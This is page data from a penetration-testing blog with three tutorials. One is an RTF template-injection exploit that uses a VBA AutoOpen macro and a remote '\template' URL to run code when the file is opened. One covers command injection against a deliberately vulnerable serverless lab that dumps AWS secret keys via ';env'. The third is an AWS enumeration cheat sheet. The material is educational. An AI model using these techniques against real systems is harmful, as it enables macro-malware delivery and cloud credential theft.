{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/rtf-template-injection/","result":{"pageContext":{"post":{"fields":{"slug":"/rtf-template-injection"},"excerpt":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.…","frontmatter":{"date":"9th February 2022 ","title":"RTF Template Injection","description":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.","tags":"exploit-development, rtf","posttype":"article"},"body":"\nIn this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.\n\n## What is an RTF file?\n\nTapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?\n\nRTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type. \n\n## Why should I care?\n\n\"Why should I care?\" you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!  \n\n# Instructions - RTF template injection with a calculator pop-up\n\nIn this example, we will demonstrate how to use the \"template\" control word to cause an RTF file to fetch another file from a web server controlled by us.  This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.\n\n<h5 class=\"step\">Step 1 - Create a macro-enabled Word template file</h5>\n\nThis file will contain our macro that executes the calculator app when the RTF file is opened. \n\nOpen Word and add the following Visual Basic code (macro) to it. Save the file as `calc.dotm`. \n\n```\nSub AutoOpen()\nDim Program As String\nDim TaskID As Double\nProgram = \"calc.exe\"\nTaskID = Shell(Program, 1)\nEnd Sub\n```\n\n*If you are unfamiliar with creating Word template files, we recommend checking out Microsoft's documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.*\n\n<h5 class=\"step\">Step 2 - Start a web server</h5>\n\nLaunch an HTTP server in the folder containing the 'calc.dotm' file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice. \n\n```\npython3 -m http.server <port number>\n```\n\n<h5 class=\"step\">Step 3 - Create a benign RTF file</h5>\n\nGet or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.\n\n![](5e05c49b-2704-464a-9eb8-6afe16b298ec.png)\n\n*There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.*\n\n<h5 class=\"step\">Step 4 - Add remote template fetching capabilities to the RTF file</h5>\n\nUse a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo. \n\nLook for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font's ending tag with your listening IP and port + payload/file to fetch. \n\n```\n{\\*\\template http://<your-IP>:<port number>/calc.dotm}\n```\n\n![](514cab5a-57fa-4783-9db1-35ca3867a8ef.png)\n\n<h5 class=\"step\">Step 5 - Show time</h5>\n\nSave the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.\n\nThe below screen capture displays the macro-enabled template file being fetched.\n\n![](20e0eb7d-9a66-4ff2-991c-366e9a7a3d84.png)\n\nThe below screen capture displays the RTF file opened and the calculator app launched.\n\n![](c6ec75ba-dad0-4755-903a-7de8f5065320.png)\n\n### Well that was easy... Where to from here?\n\nI hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?"},"prev":{"fields":{"slug":"/cloud-hacking-serverless-function-injection"},"excerpt":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions…","frontmatter":{"date":"16th February 2022 ","title":"Cloud Hacking :- Serverless Function Injection","description":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.","tags":"cloud, how-to, serverless-functions","posttype":"article"},"body":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.\n\n##What is a function?\n\nIt is a piece of code that you can use over and over again to perform a task.\n\n##What is serverless?\n\nIn serverless architecture, you are building and running code on someone else's computer. In cloud context, the computer belongs to the cloud provider and resides on their premises. Because the computer serves your code, it is referred to as a server. The cloud provider is responsible for maintaining the server and, thus, you are left with a \"serverless\" setting.\n\n##Piecing it together - A serverless function\n\nA serverless function is a piece of code that runs on the cloud provider's computer and it can perform a task over and over again.\n\n##What are some examples of serverless functions?\n\n* AWS Lambda\n* Microsoft Azure Functions\n* Google Cloud Functions\n\nTo perform a task, the function requires an event or a trigger. These events or triggers can originate from different sources. Examples include:\n\n* HTTP APIs\n* Changes in systems like databases\n* Other alerting systems\n\n##Where does the injection come in?\n\nIn context of serverless functions, injection vulnerabilities occur when unexpected input is sent to the function. The process of sending unexpected input can be referred to as an injection attack. \n\n##Why does it work?\n\nTwo aspects come into play:\n\n1. Your ability to control variables passed to the function;\n3. Whether the server trusts your input and executes it.\n\nIn case of command injection vulnerabilities, the function should run shell or operating system commands in the background.\n\nNow that we have our foundations set up, let us demonstrate this with an easy-to-follow example.\n\n#Serverless event-data injection\n\nThis example demonstrates how to execute unwanted code via a serverless function. To do this example, you will only require a browser. We have done this example using the OWASP ServerlessGoat web application, which you can find in the below URL.\n\n* https://www.serverless-hack.me/\n\nThe application converts Doc files to text from a URL. The output is then displayed on the screen.\n\n![](b576cf8f-2a9d-43b3-a1d1-3ed12f9b0f12.png)\n\nIn case of OWASP ServerlessGoat, the injection vulnerability occurs when the Doc filename is appended with code that gets executed. \n\n##Instructions\n\n<h5 class=\"step\">Step 1 - Navigate to https://www.serverless-hack.me/</h5>\n\nThe vulnerable app resides here. You can alternatively create your own serverless functions in the cloud!\n\n<h5 class=\"step\">Step 2 - Append the filename with the command you want to execute.</h5>\n\nFor example, using a semi-comma to separate the filename from the command you want to execute will print out the environment variables:\n```\nhttps://www.puresec.io/hubfs/document.doc;env\n```\n\nThe output will display a secret (the AWS secret access key)!\n\n![](96002e52-8f1b-496a-ba9c-0c4631826a30.png)\n\nOr to output text of your choice, you can use the \"echo\" command:\n```\nhttps://www.puresec.io/hubfs/document.doc;echo \"hello\"\n```\n\nDisplayed below is \"hello\" echoed back to us.\n\n![](6359b91a-fa74-45f0-b9c2-52f5b3a49fae.png)\n\nTo understand why this works, you may wish to review the code used for the function:\n```\nconst child_process = require('child_process');\nconst AWS = require('aws-sdk');\nconst uuid = require('node-uuid');\n\nasync function log(event) {\n  const docClient = new AWS.DynamoDB.DocumentClient();\n  let requestid = event.requestContext.requestId;\n  let ip = event.requestContext.identity.sourceIp;\n  let documentUrl = event.queryStringParameters.document_url;\n\n  await docClient.put({\n      TableName: process.env.TABLE_NAME,\n      Item: {\n        'id': requestid,\n        'ip': ip,\n        'document_url': documentUrl\n      }\n    }\n  ).promise();\n\n}\n\nexports.handler = async (event) => {\n  try {\n    await log(event);\n\n    let documentUrl = event.queryStringParameters.document_url;\n\n    let txt = child_process.execSync(`curl --silent -L ${documentUrl} | /lib64/ld-linux-x86-64.so.2 ./bin/catdoc -`).toString();\n\n    // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file.\n    let key = uuid.v4();\n    let s3 = new AWS.S3();\n    await s3.putObject({\n      Bucket: process.env.BUCKET_NAME,\n      Key: key,\n      Body: txt,\n      ContentType: 'text/html',\n      ACL: 'public-read'\n    }).promise();\n\n    return {\n      statusCode: 302,\n      headers: {\n        \"Location\": `${process.env.BUCKET_URL}/${key}`\n      }\n    };\n  }\n  catch (err) {\n    return {\n      statusCode: 500,\n      body: err.stack\n    };\n  }\n};\n```\n\n##Well that was easy... What next?\n\nWhy not look into executing other commands or practice with creating your own serverless functions next?"},"next":{"fields":{"slug":"/speaking-aws"},"excerpt":null,"frontmatter":{"date":"9th February 2022 ","title":"Speaking AWS","description":"aws, cloud, s3-buckets, scoutsuite","tags":"aws, cloud, s3-buckets, scoutsuite","posttype":"article"},"body":"# Introduction To Terminology\n\n\n| AWS Term                             | Pentester Analogy                                                                           |\n|--------------------------------------|---------------------------------------------------------------------------------------------|\n| Region                               | Geographical location containing availability zones                                         |\n| AZ (Availability Zone)               | Location mapped to a physical data centre in a region                                       |\n| VPC (Virtual Private Cloud)          | The network infrastructure (can include public and private subnets)                         |\n| EC2 (Elastic Compute Cloud) instance | Virtual Machine                                                                             |\n| Security Groups                      | Firewall rules applied to the single instance                                               |\n| Network ACL                          | Firewall rules applied to a subnet                                                          |\n| ELB (Elastic Load Balancer)          | Network load balancer to optimise traffic across instances.                                 |\n| IAM (Identity & Access Management)   | A service to manage users, groups, roles and security policies                              |\n| S3 (Simple Storage Service Bucket)   | A container for any type of data                                                            |\n| CloudTrail & CloudWatch              | Logging, Monitoring and Auditing of Events.                                                 |\n| RDS (Relational Database Service)    | A service allowing the creation of relational databases (MS SQL, Oracle, Aurora/MySQL, etc) |\n| KMS (Key Management Service)         | KeyChain, Password Vault, etc                                                               |\n\nhttps://cloudonaut.io/aws-security-primer/\n\n\n# Orientation \n\nConfigure the CLI for first usage\n```\naws configure --profile <profile name>\n```\n\n> It should be noted that the credentials will be stored in your home directory: `~/.aws/credentials`\n\nList AWS regions & VPC(s) available\n```\naws ec2 describe-regions\naws ec2 describe-vpcs\n```\n\nGet AWS console alias\n```\naws iam list-account-aliases\n```\n\nGet username associated to an AWS API KEY\n```\naws iam get-user\n```\n\nIf you have no access to IAM then the following command will work.\n```\naws sts get-caller-identity \n```\n\n## Getting Your Whereabouts\n\n\nFind Your ID\n```\naws sts get-caller-identity\n```\n\nLog in to the console\n```\nhttps://Your_Account_ID.signin.aws.amazon.com/console/\n```\n\n## Setting Up Temporary Credentials\n\nTo use the credentials returned by the assume-role \n\nIn Linux set some bash variables with export\n```\n$ export AWS_ACCESS_KEY_ID=XXXX\n$ export AWS_SECRET_ACCESS_KEY=XXXX\n$ export AWS_SESSION_TOKEN=XXXX\n```\n\nIn Windows do the equivalent with SET\n```\nC:\\> SET AWS_ACCESS_KEY_ID=XXXX\nC:\\> SET AWS_SECRET_ACCESS_KEY=XXXX\nC:\\> SET AWS_SESSION_TOKEN=XXXX\n```\n\n> Note that this will set the credentials for your default AWS account in your machine. This is similar to running `aws configure` without specifying a profile name. \n\nSecurity Groups vs Network ACLs\n\n| Security Group                                                                                                                                                | Network ACL                                                                                                                                            |\n|---------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|\n| First layer of defence                                                                                                                                        | Second Layer of defence                                                                                                                                |\n| Operates at instance level                                                                                                                                    | Operates at subnet level                                                                                                                               |\n| Supports allow rules only                                                                                                                                     | Supports allow and deny rules                                                                                                                          |\n| \"stateful\": Return traffic is automatically allowed regardless of any rules                                                                                   | \"stateless\": Return traffic must be explicitly allowed by the rules                                                                                     |\n| All rules are evaluated before deciding if traffic is allowed                                                                                                 | Rules are evaluated in order when deciding to allow traffic                                                                                            |\n| Applies to an instance only if someone specifies the security group when launching the instance, or associates the security group with the instance later on. | Automatically applies to all instances in the subnets it's associated with (therefore, you don't have to rely on users to specify the security group). |\n\n## Installing AWS CLI\n\n\n\n\n## Enumerating With AWS CLI\n\n\n\n### S3 Buckets\n\n\n```\naws sts assume-role --role-arn arn:aws:iam::093313834310:role/pentesterRole --role-session-name pentesterRole --profile assessment\n```\n\n\nListing Buckets\n```\naws s3 ls \naws s3api list-buckets \n```\n\n\nCopy File From Bucket To Current Directory\n```\naws s3 cp s3://this-will-be-the-bucket-name/the-name-of-the-file.txt . \n```\n\n\n\n## Networking Configuration Review \n\n### Using Cloud Mapper\n\n<h5 class=\"step\">Edit the config.json file to enter the AWS ID</h5>\n\nWe can edit the config file via the `cloudmapper.py` python script. \n```\npython cloudmapper.py configure add-account --config-file <config.json> --name <arbitrary name> --id <AWS Account ID>\n```\n\nOr we can just directly edit the config.json file using your prefered editor. Which of course is `vi` ;-)\n```\nvi config.json\n```\n\n<h5 class=\"step\">Prepare and start the Web Server</h5>\n\n\nFirst we prepare\n```\npython cloudmapper.py prepare --config <config.json> --account <arbitrary_name>\n```\n\nThen we start\n```\npython cloudmapper.py webserver\n```\n\n## ScoutSuite\n\n\nInstalling ScoutSuite\n```\n$ git clone https://github.com/nccgroup/ScoutSuite\n$ cd ScoutSuite\n$ virtualenv -p python3 venv\n$ source venv/bin/activate\n$ pip install -r requirements.txt\n$ python scout.py --help\n```\n\nWe can run ScoutSuite in the following way. We use the `--profile` to specify API credentials to use. \n```\nscout.py --provider aws --profile <profile_name>\n```\n\n> Specifying the provider type (aws) and credentials is mandatory. \n\nWe can specify a report directory to store results with the `--report-dir` flag. \n```\nscout.py --provider aws --profile <profile_name>  --report-dir <folder>\n```\n\nWe can specify which regions we want ScoutSuite to look at with the `--regions` flag. \n```\nscout.py --provider aws --profile <profile_name> --region us-east-1,eu-west-1\n```\n\nWe can limit the services we want to check for\n```\nscout.py --provider aws --profile <profile_name> --services iam,s3\n```\n\nThere are other flags that may be of interest which can be found by looking at the help `--help`\n```\nscout.py --help\n```\n\n## Priv Escalation\n\n\nPmapper tool by NCC \n\n\n### Pacu\n\n\n<a href=\"https://github.com/RhinoSecurityLabs/pacu\" target=\"_blank\" class=\"external\" title=\"Pacu Tool By Rhino Security Labs\" rel=”nofollow”>Pacu Tool By Rhino Security Labs</a>\n\n\nInstalling Pacu\n```\npip3 install pip\npip3 install -U pacu\npacu\n```\n\nEnumeration of the root user. Can be done manually but after a few attempts, it requires a captcha. \n\n\nEnumeration of Account ID via \n```\nIAM -> Roles > Elevate-S3 > Edit trust policy\n```\n\nThe team over at Rhino Security have a great write up on how to enumerate users via this process. <a href=\"https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/\" target=\"_blank\" class=\"external\" title=\"AWS IAM User Enumeration\" rel=”nofollow”>Rhino Security Labs - AWS IAM User Enumeration</a>\n\n\n## Steam Pipe\n\n\nRunning SteamPipe\n```\nsteampipe check benchmark.cis_v140 --export=report.html --export=report.csv\n```\n\n\n## Prowler\n\n\nRunning Prowler. Use the `-p` flag to specify API profile to use\n```\n./prowler -p <profile_name>\n```\n\nUse `ansi2html` if you want an HTML report\n```\npip install ansi2html\n./prowler -p <profile_name> | ansi2html -la > report.html\n```\n\n## Assessing AWS\n\n> The following is a very generic methodology you can use until you refine your own approach via experience. \n\n* Launch Scout Suite to collect configuration data and initial list of issues\n* Launch prowler and collect list of issues\n* Review Trusted Advisor (if available for the account)"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}